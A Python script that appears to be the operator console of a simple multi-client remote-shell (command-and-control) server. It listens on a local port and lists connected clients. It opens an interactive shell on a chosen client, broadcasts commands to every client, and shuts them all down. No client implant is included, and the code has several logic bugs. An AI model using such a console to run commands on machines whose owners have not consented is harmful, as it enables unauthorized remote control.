import threading
import socket
import json
import sys
import os
import subprocess

clients = []
ip_addr = []
die = False


def server_menu():
    global client
    global die
    global ip
    while True:
        command = input("Server~$")
        if command == "list":
            if not clients:
                print("No Connected Clients")
            else:

                print("--------------Clients--------------")
                for index, ips in enumerate(ip_addr):
                    print(f"{str(index)}   {str(ips)}")
        elif "connect " in command:
            connection_index = int(command.strip("connect "))
            try:
                print(f"Connecting to {str(ip_addr[connection_index])}")
            except:
                print("Client Does Not Exist Or the connection is broken")
                continue
            client = clients[connection_index]
            ip = ip_addr[connection_index]
            communication(client_object=client, ip_addrs=ip)
        elif command=="exit":
            for clienta in clients:
                client = clienta
                send_msg("EXIT")
                die = True
                sock.close()
                sys.exit()
        elif command[:8] == "sendall ":
            for clienta in clients:
                client = clienta
                send_msg("SENDALL:" + command[8:])
                print(recive_message())
        elif command=="help":
            print("""
-------------------------Commands----------------------------
list               Lists All The Connected Clients
connect <NUMBER>   Connect To Client Shell
sendall <COMMAND>  Sends All Clients A Command
exit               Exits Server And Kills Clients
""")

def connection_thread():
    global die
    global connected
    while not die:
        sock.listen()
        client, ip = sock.accept()
        clients.append(client)
        ip_addr.append(ip)
        
        print(f"\nRecived Connection From: {str(ip)}\nPress Enter to Continue...", end="")
        continue
    exit()

def send_msg(message):
    client.send(message.encode())

def recive_message():
    msg = client.recv(1024).decode()
    return str(msg)


def communication(client_object, ip_addrs):
    global client
    global ip
    client = client_object
    ip = ip_addrs
    while True:
        payload = input(f"{list(ip)[0]}:{list(ip)[1]}~$")
        if payload=="exit":
            client = None
            ip = None
            server_menu()
        elif payload=="":
            pass
        elif payload[:3] == "cd ":
            send_msg(payload)
        else:
            send_msg(payload)
            print("Waiting For A response\n")
            print(recive_message())
            print("\n")



if __name__=="__main__":
    connected = False
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "127.0.0.1"
    port = 5666
    sock.bind((host, port))
    threading.Thread(target=connection_thread).start()
    server_menu()
